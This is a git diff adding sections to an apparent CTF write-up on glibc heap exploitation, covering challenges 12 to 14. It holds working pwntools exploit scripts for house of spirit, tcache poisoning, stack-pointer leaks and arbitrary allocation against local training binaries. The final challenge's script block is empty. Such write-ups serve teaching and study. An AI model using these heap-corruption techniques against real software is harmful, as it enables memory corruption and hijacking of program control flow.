@@ -607,9 +607,135 @@ Notice that the exploit isn't 100% reliable. This is ok, as the reason behind th
 
 ## Challenge 12
 
-This time, our goal is for `malloc` to return a stack pointer.
+This time, our goal is for `malloc` to return a stack pointer. The handler `stack_malloc_win` performs a `malloc` request, and in case it returns a goal `stack_ptr` - calls `win`. \
+Notice we have a primitive to `free(stack_ptr)`, as well as writing to `64` bytes long buffer, resides right before the `stack_ptr`. 
+
+So it seems the goal of this challenge is to perform house-of-spirit, meaning to create a valid chunk on the stack, and injecting it into the tcachebin.
+
+```python
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+    
+    buf = b'A' * 0x30
+    buf += b'B' * 8  # prev_size
+    buf += struct.pack(b'<Q', 0x41)  # size, malloc of 0x2b corresponds to chunk 0x40
+    stack_scanf(p, buf)
+    stack_free(p)
+    stack_malloc_win(p)
+
+    p.interactive()
+```
+
+Worth to mention - `malloc(0x53)` request is treated with the same trick as `malloc(0x58)` - meaning it would re-use the `prev_size` of the preceding chunk, and allocate itself within `tcachebin[0x60]`.
 
 
+## Challenge 13
+
+Now, after injecting a stack chunk into the tcache, we'd like to read data off it via `free`. \
+In a similar manner, we can create a fake chunk on the stack and free it. \
+Then, we can allocate again, where the allocation would be performed on the stack-chunk, giving us write primitive on the stack, optionally overwriting the secret. 
+
+The problem is we can only write up to 127 bytes into the allocated stack chunk... We can try another approach - after injecting the stack chunk into the tcache, we can free another chunk off the same bin, so that its `next` would be the stack pointer. It would grant us leak of the stack pointer. \
+From this, we would be able to forge another fake chunk, via `allocate_chunk_at_addr`. Since we cannot write to a chunk within this challenge, as `scanf("%0s")` is being used, we have to make sure we would be allocated right on the secret address. 
+
+Therefore, my solution involves forcing an allocation right off the secret address. Notice, however, that it nullifies the second qword of the secret. \
+Moreover, upon inserting the expected secret, there are garbage 8 bytes on the input. Hence, we have to nullify them too so the secrets would match. 
+
+The following might be abit overkill, but it gets the job done:
+
+```python
+def allocate_chunk_at_addr(p, addr, size):
+    '''
+    Allocates chunk at specified addr. Accessible within slot[3]
+    '''
+    buf = struct.pack('<Q', addr)
+    malloc(p, 0, size)
+    malloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
+    scanf(p, 0, buf)  # Overwrite its next pointer to our addr
+    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
+    malloc(p, 3, size)  # Now the chunk is allocated on the addr, which address is stored on slot 3!
+
+    return
+
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'at ')
+    leak = int(p.readline()[:-2], 16)
+    print(f'secret: {hex(leak)}')
+    p.recvuntil(b'quit): ')
+    
+    alloc_size = 0xa2
+    buf = b'A' * 0x30
+    buf += b'B' * 8  # prev_size
+    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
+    malloc(p, 0, alloc_size)
+    stack_scanf(p, buf)
+    stack_free(p)
+    free(p, 0)
+    stack_pointer_leak = puts(p, 0) + b'\x00' * 2  # leak the next_ptr of the chunk
+    assert(len(stack_pointer_leak) == 8)  # may contain white characters..
+    stack_pointer_leak = struct.unpack('<Q', stack_pointer_leak)[0]  # Leaks the address of the stack_ptr
+    print(f'stack_leak: {hex(stack_pointer_leak)}')
+
+    secret_addr = stack_pointer_leak + alloc_size
+    allocate_chunk_at_addr(p, secret_addr, 0x80)
+    print(f'allocated chunk at addr: {hex(secret_addr)}')
+    secret_leak = puts(p, 3)
+    print(f'got data: {secret_leak}')
+
+    allocate_chunk_at_addr(p, secret_addr + 0x1e, 0x80)  # Nullify the second qword
+    send_flag(p, secret_leak)
+
+    p.interactive()
+```
+
+## Challenge 13.1
+
+Unlike challenge 13, this time the secret resides at offset `0x80`. Moreover, the LSB of the secret is always `0x00`, hence we won't be able to leak the first qword of it. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+    
+    alloc_size = 0xa0  # arbitrary size
+    buf = b'A' * 0x30
+    buf += b'B' * 8  # prev_size
+    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
+    malloc(p, 0, alloc_size)
+    stack_scanf(p, buf)
+    stack_free(p)
+    free(p, 0)
+    stack_pointer_leak = puts(p, 0) + b'\x00' * 2  # leak the next_ptr of the chunk
+    assert(len(stack_pointer_leak) == 8)  # may contain white characters..
+    stack_pointer_leak = struct.unpack('<Q', stack_pointer_leak)[0]  # Leaks the address of the stack_ptr
+    print(f'stack_leak: {hex(stack_pointer_leak)}')
+
+    secret_addr = stack_pointer_leak + 0x81
+    allocate_chunk_at_addr(p, secret_addr, 0x80)  # arbitrary size
+    allocate_chunk_at_addr(p, secret_addr - 8, 0x80)
+    print(f'Nullified secret at addr: {hex(secret_addr)}')
+
+    # allocate_chunk_at_addr(p, secret_addr + 0x1e, 0x80)  # Nullify the second qword
+    send_flag(p, b'\x00' * 16)
+
+    p.interactive()
+```
+
+## Challenge 14
+
+Now we have to obtain control flow over the program. There's a `win` function exists within the binary. We should retrieve a PIE program leak to resolve it, which can be done via the `echo` handler - which sets a PIE pointers into a chunk returned by `malloc(0x20)`. As long as we can read a pointer of a slot, we can easily obtain this value. 
+
+Moreover, we'd need a stack leakage - which can be obtained by performing House of Spirit - writing a fake chunk on the stack via `stack_scanf`, and injecting it into the tcachebin via `stack_free`. 
+
+Finally, we'd utilize arbitrary write primitive (by tcache poisioning) to overwrite `main_ra` into `win`. 
+
+```python
+
+```
 
 
 [heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
